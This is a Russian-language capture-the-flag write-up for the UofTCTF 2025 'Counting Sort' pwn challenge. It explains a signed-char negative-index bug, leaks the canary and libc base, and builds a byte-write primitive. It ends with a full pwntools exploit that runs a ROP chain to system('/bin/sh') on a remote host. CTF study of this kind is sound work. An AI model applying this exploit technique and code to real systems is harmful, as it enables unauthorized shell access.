---
layout: post
title:  "UofTCTF 2025 — Counting Sort"
date:   2024-01-14 13:37:00 +0300
categories: ctf writeup
tags: linux pwn ROP 
---

*Подписывайтесь на TG канал [/b/exploits](https://t.me/sploitdev)*

Разберём таск с прошедшего [UofTCTF 2025](https://ctftime.org/event/2570)

![](/assets/UofTCTF-Sort/Pasted%20image%2020250113103139.png)

Файлы из архива.

![](/assets/UofTCTF-Sort/Pasted%20image%2020250112210823.png)

Быстро взглянем на окружение.

![](/assets/UofTCTF-Sort/Pasted%20image%2020250112210929.png)

В целом ничего интересного, но обратим внимание где именно запускается бинарь внутри контейнера. 

Смотрим main:

![](/assets/UofTCTF-Sort/Pasted%20image%2020250112210719.png)

Функция `setup` не интересна в контексте решения таска.
Смотрим всю оставшуюся логику:

![](/assets/UofTCTF-Sort/Pasted%20image%2020250112211329.png)

Подробно разберём код. 
1. У нас есть стековый буфер размером 256 байт который очищается в начале функции (строка 16)
2. Далее мы инициализируем указатель на стеке на этот буфер (строка 17)
3. Выделяем буфер на куче размером 512 байт и читаем в него данные пользователя (строка 18 и 19)
4. Запускается цикл по введённым значениям (строка 20)
5. Внутри цикла мы используем очередной введённый байт как индекс для массива на стеке (строка 22). То есть мы берём значение введённого байта (от 0 до 255) и получаем адрес на стеке. Размер массива на стеке 256 байт и максимальное значение индекса не может его превышать. Кажется, что это выглядит безопасно. Но нюанс в том, что тип данных хранимых в буфере на куче — это `char`, а он является знаковым типом. Это означает, что мы можем передать отрицательное значение и будем получать адреса на стеке которые располагаются выше чем наш стековый массив.
6. Также внутри цикла (строка 23) мы инкрементируем значение по полученному в прошлом шаге адресу на стеке
7. После цикла мы освобождаем буфер на хипе (строка 25)
8. Начинается ещё один цикл в котором идёт проход по массиву на стеке (строка 26)
9. Внутри цикла мы получаем очередной адрес стека и инкрементируем указатель (строка 28)
10. Разыменовываем указатель и получаем байт по этому адресу (строка 29)
11. Внутренний цикл до значения байта из прошлого шага (строка 30)
12. Печатаем на экран текущий счётчик внешнего цикла (строка 31)

Второй цикл позволяет нам печатать на экран содержимое по указателю на стек, то есть если мы сможем его сдвинуть, то сможем получить утечку адресов со стека.

Чтобы поменять указатель на стек мы будем использовать уязвимость найденную в первом цикле. Она позволяет инкрементировать байты по отрицательным индексам относительно начала массива на стеке.

![](/assets/UofTCTF-Sort/Pasted%20image%2020250113093559.png)

Мы адресуемся относительно `stack_buf` и нам надо дотянуться до указатель на этот же буфер `p_stack_buf`. Если мы передадим отрицательный индекс, то сможем поменять любой байт `p_stack_buf` и он будет указывать в другое место. Но, как только мы поменяем указатель `p_stack_buf` мы будем адресовываться от нового места куда он будет указывать.

Так как у нас примитив которые инкрементирует значение мы можем переписать второй младший байт указателя `p_stack_buf` и передвинуть указатель на 256 байт вперёд:

![](/assets/UofTCTF-Sort/Pasted%20image%2020250114000341.png)

Меняя указатель мы будем адресоваться относительно места на стеке где лежит указатель на стековый фрейм предыдущей функции.

Посмотрим как это будет выглядеть в отладчике. Реализуем простой POC который меняет указатель.

```python
import pwn
pwn.context.terminal = ['tmux', 'splitw', '-h']
r = pwn.process('./chall')

pwn.gdb.attach(io, '''
b *sort+450
b *sort+623
''')

pwn.pause()
payload = [-15]
payload = [x & 0xFF for x in payload]

r.send(bytes(payload))
```

Запустим и посмотрим в отладчике куда передвинется наш указатель. Изначально он указывает корректно на стек.

![](/assets/UofTCTF-Sort/Pasted%20image%2020250114001241.png)

Но после одного шага цикла мы двинем его дальше.

![](/assets/UofTCTF-Sort/Pasted%20image%2020250114001434.png)

Видим, что наш указатель переместился и теперь мы будем адресовываться гораздо дальше по стеку и сможем дотянуться до адреса возврата в `main`, а также до адреса возврата в `libc`. 

Изобразим эту идею на картинке. Красными стрелками показаны смещения относительно превоначального адреса и куда указывает `p_stack_buf`. А жёлтыми показано куда переместится наш указатель и как теперь будет работать индексация массива.

![](/assets/UofTCTF-Sort/Pasted%20image%2020250114002217.png)

После передвижения указателя мы сможем ликнуть данные лежащие на стеке после этого указателя. Надо только правильно обработать их. Код для обработки лика представлен ниже. 
```python
leak = b''
for i in range(1000000000):
    part = r.recv(1024, timeout = 1.5)
    leak += part

    if len(part) == 0:
        break

buffer = []

for i in range(256):
    buffer.append(leak.count(i))

data = bytes(buffer)
elf_base = pwn.u64(data[0:8]) - 0xd98
canary = pwn.u64(data[8:16])
libc_base = pwn.u64(data[40:48]) - 0x2a1ca

print(f'elf_base % 0x{elf_base:X}')
print(f'canary % 0x{canary:X}')
print(f'libc_base % 0x{libc_base:X}')
```

В итоге мы получим адрес `libc` и сможем переписать адрес возврата из `main` на любой другой адрес. 

Но для того, чтобы записать произвольное количество байт на стек нам нужен примитив который может писать любой байт. Так как ввод ограничен необходимо зациклить программу. Это можно сделать перезаписью адреса возврата из `sort` на начало `main`.

Реализуем это в виде отдельной функции которая выставляет необходимый байт.
```python
def set_byte(offset, value):
    payload = [-15] + [0x18] * (0x100 - 0xbc + 0xa8) + [0x28 + offset] * value
    payload = [x & 0xFF for x in payload]

    assert len(payload) < 512

    pwn.sleep(0.2)

    r.send(bytes(payload))

    leak = b''
    for i in range(100000):
        part = r.recv(1024, timeout = 0.2)
        leak += part

        if len(part) == 0:
            break

    print(f'[{offset}] => {hex(value)} ({len(payload)})')
```

Теперь у нас есть все примитивы чтобы писать на стек любые байты. Запишем ROP-цепочку для вызова `system("/bin/sh")` и запустим наш скрипт.

![](/assets/UofTCTF-Sort/Pasted%20image%2020250114093337.png)

Полный код эксплоита представлен ниже или на [нашем гитхабе](https://github.com/splodev/writeups/tree/main/CTFs/UofTCTF_2025/Counting_Sort).

```python
import pwn

pwn.context.terminal = ['tmux', 'splitw', '-h']

r = pwn.remote('34.170.104.126',5000)

pop_rdi_ret = 0x2a873 # : pop rdi; ret; 
system = 0x58740 # system
binsh = 0x1cb42f # /bin/sh\x00 string offset

def leak_stack(): 
    payload = [-15] + [0x18] * (0x100 - 0xbc + 0xa8)
    payload = [x & 0xFF for x in payload]

    pwn.sleep(0.5)
    r.send(bytes(payload))

    leak = b''
    for i in range(100000):
        part = r.recv(1024, timeout = 0.5)
        leak += part

        if len(part) == 0:
            break

    buffer = []

    for i in range(256):
        buffer.append(leak.count(i))

    data = bytes(buffer)
    return data


def set_byte(offset, value):
    payload = [-15] + [0x18] * (0x100 - 0xbc + 0xa8) + [0x28 + offset] * value
    payload = [x & 0xFF for x in payload]

    assert len(payload) < 512

    pwn.sleep(0.2)

    r.send(bytes(payload))

    leak = b''
    for i in range(100000):
        part = r.recv(1024, timeout = 0.2)
        leak += part

        if len(part) == 0:
            break

    print(f'[{offset}] => {hex(value)} ({len(payload)})')

leaked = leak_stack()
stack_values = [
    pwn.u64(leaked[40:48]),
    pwn.u64(leaked[48:56]),
    pwn.u64(leaked[56:64]),
    pwn.u64(leaked[64:72]),
]

libc_base = pwn.u64(leaked[40:48]) - 0x2a1ca
print(f'libc_base @ 0x{libc_base:x}')

target_values = [
    libc_base + pop_rdi_ret,
    libc_base + binsh,
    0x00,
    libc_base + system,
]

for i in range(len(target_values)):
    stack = stack_values[i]
    target = target_values[i]

    for k in range(8):
        value1 = (0x100 - ((stack >> (k*8)) & 0xFF)) & 0xFF
        print(f'setting byte {i}*8 + {k} to {hex(value1)}')
        set_byte(i*8 + k, value1)
        value2 = (target >> (k*8)) & 0xFF
        print(f'setting byte {i}*8 + {k} to {hex(value2)}')
        set_byte(i*8 + k, value2)

r.interactive()
```

*Подписывайтесь на TG канал [/b/exploits](https://t.me/sploitdev)*